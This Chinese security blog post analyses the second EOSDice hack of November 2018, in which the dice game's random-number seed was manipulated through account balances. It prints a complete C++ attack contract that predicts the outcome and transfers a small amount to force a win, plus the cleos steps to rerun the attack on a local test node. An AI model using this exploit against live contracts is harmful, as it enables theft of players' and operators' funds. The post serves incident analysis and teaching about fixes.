---
title: EOS DApp 随机数漏洞分析2 - EOSDice 随机数被操控
date: 2019-05-14 23:03:59
permalink: eosdice-random2
category:
    - 区块链安全
tags:
    - 随机数
    - EOS DApp
author: 零时科技
---

EOSDice 在2018年11月10日再次受到黑客攻击，被盗`4,633 EOS`，约合 2.51 万美元，针对这个漏洞，零时科技团队进行了详细的分析及攻击过程复盘，尽管这个漏洞已经发生过一段时间，不过因随机数被预测依旧值得大家关注。

<!-- more -->

## 漏洞背景

`EOSDice` 在上一次漏洞修复后，2018年11月10日再次受到黑客攻击，根据`EOSDice`官方通告，此次攻击共被盗`4,633 EOS`，约合 2.51 万美元（当时 1 EOS ≈ 5.42 USD），


## 技术分析 

2018年11月3日，也就是一周前，`EOSDice`因为dApp中存在可被预测随机数漏洞被黑客攻击，在前一篇文章中已经分析过了黑客的攻击手法 [EOS dApp 漏洞盘点-EOSDice弱随机数漏洞1](https://learnblockchain.cn/2019/05/14/eosdice-random1/)。然而，上次的官方修复仍然存在问题，导致再次被黑客攻击。

我们再来分析一下`EOSDice`上次遭受攻击后官方的修复方法：

- 开奖`action`由一次`defer`改为两次`defer`

![漏洞修复 两次defer action](https://img.learnblockchain.cn/2019/15578485621856.jpg)

两次defer action代码在这个[提交](https://github.com/loveblockchain/eosdice/commit/50a05dfb6c0d68b6035ed49d01133b5c2edaefdf) 。


我们做了一个两次defer action开奖示意图：

![两次defer action开奖](https://img.learnblockchain.cn/2019/15578475825441.jpg!/scale/35%)


可以看到，通过两次`defer action`开奖的时候，开奖`action`的`refer block`为下注的`block`，下注前无法预测。


- 账户的余额用很多账户的总和加起来当成随机数种子

![多账户余额](https://img.learnblockchain.cn/2019/15578483961712.jpg)


漏洞修复代码在这个[提交](https://github.com/loveblockchain/eosdice/commit/3c6f9bac570cac236302e94b62432b73f6e74c3b)


本次修改看似无懈可击，不过还有一点`EOSDice`官方没有想到。我们来看看`eosio.token`的转账代码。

![](https://img.learnblockchain.cn/2019/15578476021212.jpg)


可以看到，当A账户给B账户转账的时候，转账通知会先发送给A账户，再发送给B账户。那么，黑客可以部署一个攻击合约，当黑客通过此账号来进行游戏的时候，攻击合约肯定先于`EOSDice`官方合约收到转账通知。黑客可以同样做一个两次`defer action`来预测随机数

![](https://img.learnblockchain.cn/2019/15578476191725.jpg!/scale/35%)


下图是利用攻击合约预测随机数。

![](https://img.learnblockchain.cn/2019/15578476270231.jpg)


可以看到，黑客完全可以通过攻击合约来预测随机数的结果。不过，问题来了由于使用了两次`defer action`进行开奖，那么这个结果是黑客无法在下注前得到的。因此，黑客要对`EOSDice`进行攻击只能另辟蹊径。


### 用户测试的攻击合约

因为`EOSDice`中，随机数种子是很多账户余额的总和，黑客完全可以通过计算能让黑客稳赢的状态下这个余额的值，然后在给任意账户转账即可控制`EOSDice`的随机数结果。下面我们编写一个测试合约进行试验：

```c++
#include <utility>
#include <vector>
#include <string>
#include <eosiolib/eosio.hpp>
#include <eosiolib/time.hpp>
#include <eosiolib/asset.hpp>
#include <eosiolib/contract.hpp>
#include <eosiolib/types.hpp>
#include <eosiolib/transaction.hpp>
#include <eosiolib/crypto.h>
#include <boost/algorithm/string.hpp>
#include "eosio.token.hpp"

#define EOS_SYMBOL S(4, EOS)

using eosio::asset;
using eosio::permission_level;
using eosio::action;
using eosio::print;
using eosio::name;
using eosio::unpack_action_data;
using eosio::symbol_type;
using eosio::transaction;
using eosio::time_point_sec;


class attack : public eosio::contract {
    public: 
        uint64_t id = 66;
        attack(account_name self):eosio::contract(self)
        {}

        uint8_t random(account_name name, uint64_t game_id, uint64_t add)
        {
            auto eos_token = eosio::token(N(eosio.token));
            asset pool_eos = eos_token.get_balance(N(eosbocai2222), symbol_type(S(4, EOS)).name());
            asset ram_eos = eos_token.get_balance(N(eosio.ram), symbol_type(S(4, EOS)).name());
            asset betdiceadmin_eos = eos_token.get_balance(N(betdiceadmin), symbol_type(S(4, EOS)).name());
            asset newdexpocket_eos = eos_token.get_balance(N(newdexpocket), symbol_type(S(4, EOS)).name());
            asset chintailease_eos = eos_token.get_balance(N(chintailease), symbol_type(S(4, EOS)).name());
            asset eosbiggame44_eos = eos_token.get_balance(N(eosbiggame44), symbol_type(S(4, EOS)).name());
            asset total_eos = asset(0, EOS_SYMBOL);

            total_eos = pool_eos + ram_eos + betdiceadmin_eos + newdexpocket_eos + chintailease_eos + eosbiggame44_eos;
            auto amount = total_eos.amount + add;
            auto mixd = tapos_block_prefix() * tapos_block_num() + name + game_id - current_time() + amount;
            print("[ATTACK RANDOM]tapos_block_prefix=>",(uint64_t)tapos_block_prefix(),"|tapos_block_num=>",(uint64_t)tapos_block_num(),"|name=>",name,"|game_id=>",game_id,"|current_time=>",current_time(),"|total=>",amount,"\n");
        
            const char *mixedChar = reinterpret_cast<const char *>(&mixd);

            checksum256 result;
            sha256((char *)mixedChar, sizeof(mixedChar), &result);

            uint64_t random_num = *(uint64_t *)(&result.hash[0]) + *(uint64_t *)(&result.hash[8]) + *(uint64_t *)(&result.hash[16]) + *(uint64_t *)(&result.hash[24]);
            return (uint8_t)(random_num % 100 + 1);
        }

        //@abi action
        void transfer(account_name from,account_name to,asset quantity,std::string memo)
        {
            if (from == N(eosbocai2222))
            {
                return;
            }
            transaction txn{};
            txn.actions.emplace_back(
                action(eosio::permission_level(_self, N(active)),
                    _self,
                    N(reveal1),
                    std::make_tuple(id)
                )
            );
            txn.delay_sec = 2;
            txn.send(now(), _self, false);

            print("[ATTACK] current_time => ", current_time(), "\n");
        }

        //@abi action
        void reveal1(uint64_t id)
        {
            transaction txn{};
            txn.actions.emplace_back(
                action(eosio::permission_level(_self, N(active)),
                    _self,
                    N(reveal2),
                    std::make_tuple(id)
                )
            );
            txn.delay_sec = 2;
            txn.send(now(), _self, false);
            print("[ATTACK REVEAL1] current_time => ", current_time(), "\n");
        }

        //@abi action
        void reveal2(uint64_t id)
        {
            std::string memo = "noneage";
            print("[ATTACK REVEAL2] current_time => ", current_time(), "\n");
        
            for(int i=0;i<=100;i++)
            {
                uint8_t r = random(_self, 87, i);
                if((uint64_t)r < 6)
                {
                    print("[PREDICT RANDOM] random = ", (uint64_t)r, "\n");
                    if(i > 0)
                    {
                        action(permission_level(_self, N(active)),
                            N(eosio.token),
                            N(transfer),
                            std::make_tuple(_self, N(eosbiggame44), asset(i, EOS_SYMBOL), memo))
                        .send();
                    }
                    break;
                }
            } 
        }   
};

#define EOSIO_ABI_EX( TYPE, MEMBERS ) \
extern "C" { \
   void apply( uint64_t receiver, uint64_t code, uint64_t action ) { \
      auto self = receiver; \
      if( code == self || code == N(eosio.token)) { \
         if( action == N(transfer)){ \
                eosio_assert( code == N(eosio.token), "Must transfer EOS"); \
         } \
         TYPE thiscontract( self ); \
         switch( action ) { \
            EOSIO_API( TYPE, MEMBERS ) \
         } \
         /* does not allow destructor of thiscontract to run: eosio_exit(0); */ \
      } \
   } \
}

EOSIO_ABI_EX( attack,
        (transfer)(reveal1)(reveal2)
)
```

在这个攻击合约里，我们模仿了`EOSDice`同样进行了两次`defer action`。在第二次`defer action`中，我们计算出随机数小于6的情况下，需要的总余额比原先的增加多少，然后利用一个`inline action`向`eosbiggame44`账户转账，因为攻击合约先于`EOSDice`官方合约执行，所以最终控制了`EOSDice`的随机数结果。


### 测试流程


1. 创建相关账户并设置权限

```bash
# 攻击者账户
cleos create account eosio attacker EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVk
cleos set account permission attacker active '{"threshold": 1,"keys": [{"key": "EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi","weight": 1}],"accounts":[{"permission":{"actor":"attacker","permission":"eosio.code"},"weight":1}]}' owner -p attacker@owner
# EOSDice 官方账户
cleos create account eosio eosbocai2222 EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVk
cleos set account permission eosbocai2222 active '{"threshold": 1,"keys": [{"key": "EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi","weight": 1}],"accounts":[{"permission":{"actor":"eosbocai2222","permission":"eosio.code"},"weight":1}]}' owner -p eosbocai2222@owner
# 其他需要的账户
cleos create account eosio eosio.ram EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVk
cleos create account eosio betdiceadmin EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVk
cleos create account eosio newdexpocket EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVk
cleos create account eosio chintailease EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVk
cleos create account eosio eosbiggame44 EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVk

```

2. 向相关账户充值

```bash
cleos push action eosio.token issue '["attacker", "1000.0000 EOS", "1"]' -p eosio
cleos push action eosio.token issue '["eosbocai2222", "232323.2333 EOS", "1"]' -p eosio
cleos push action eosio.token issue '["eosio.ram", "23.2333 EOS", "1"]' -p eosio
cleos push action eosio.token issue '["betdiceadmin", "23.2333 EOS", "1"]' -p eosio
cleos push action eosio.token issue '["newdexpocket", "23.2333 EOS", "1"]' -p eosio
cleos push action eosio.token issue '["chintailease", "23.2333 EOS", "1"]' -p eosio
cleos push action eosio.token issue '["eosbiggame44", "23.2333 EOS", "1"]' -p eosio
```

3. 编译相关合约并部署

```bash
# 编译攻击合约
eosiocpp -o attack.wast attack.cpp
eosiocpp -g attack.abi attack.cpp
# 部署攻击合约
cleos set contract ~/attack -p attack@owner

# 编译EOSDICE合约
eosiocpp -o eosdice.wast eosbocai2222.cpp
eosiocpp -g eosdice.abi eosbocai2222.cpp
# 部署EOSDICE合约
cleos set code eosbocai2222 eosdice.wasm -p eosbocai2222@owner
cleos set abi eosbocai2222 eosdice.abi -p eosbocai2222@owner
```

4. 初始化`EOSDice`合约

```bash
cleos push action eosbocai2222 init '[""]' -p eosbocai2222
```

5. 进行游戏（测试）

```bash
cleos push action eosio.token transfer '["attacker","eosbocai2222","1.0000 EOS", "dice-8-6-user"]' -p attacker@owner
```


6. 查看测试结果
现在，我们来看看测试结果

![测试结果](https://img.learnblockchain.cn/2019/15578476612373.jpg)


经过攻击合约多次计算，找到只需要余额比之前多 `0.0021 EOS` 即可让本次投注中奖，然后再向`eosbiggame44`转入了`0.0021 EOS`，最终中奖，获得了`19.7000 EOS`（投入`1 EOS`）。

可以看到，利用攻击合约来控制`EOSDice`的随机数，可以达到必中的效果！



## 官方修复

官方修复很简单，在随机数算法中将账户余额这个可控因子删除了。

![可控因子删除](https://img.learnblockchain.cn/2019/15578490145874.jpg)


上述的攻击合约便无法通过转账控制随机数的结果。


## 推荐修复方法

如何得到安全的随机数是一个普遍的难题，在区块链上尤其困难，因为区块链上无法获取外部随机源。

> 关于区块链随机数，推荐阅读[区块链上的随机性（一）概述与构造](https://learnblockchain.cn/2019/01/26/randomness-blockchain-1/) 及 [区块链上的构建随机性的项目分析](https://learnblockchain.cn/2019/04/22/randomness-blockchain-2/)

要在区块链上选择一个无法被提前预知种子确实困难。零时科技安全专家推荐参考 `EOS` 官方的[随机数生成方法](https://developers.eos.io/eosio-cpp/docs/random-number-generation)来生成较为安全的随机数。


文章用到的所有代码均在[github](https://github.com/NoneAge/EOS_dApp_Security_Incident_Analysis)， 本文所有过程均在本地测试节点完成。


## 参考链接

1. [eos 文档-生成随机数](https://developers.eos.io/eosio-cpp/docs/random-number-generation)
2. [eosdice 合约源码](https://github.com/loveblockchain/eosdice/tree/f1ba04ea071936a8b5ba910b76597544a9e839fa)
3. [EOS上如何安全生成随机数](https://blog.csdn.net/TurkeyCock/article/details/84730045)

本文由深入浅出区块链社区合作伙伴-[零时科技安全团队](http://www.noneage.com/)提供。

[深入浅出区块链](https://learnblockchain.cn/) - 系统学习区块链，学区块链都在这里，打造最好的区块链技术博客。



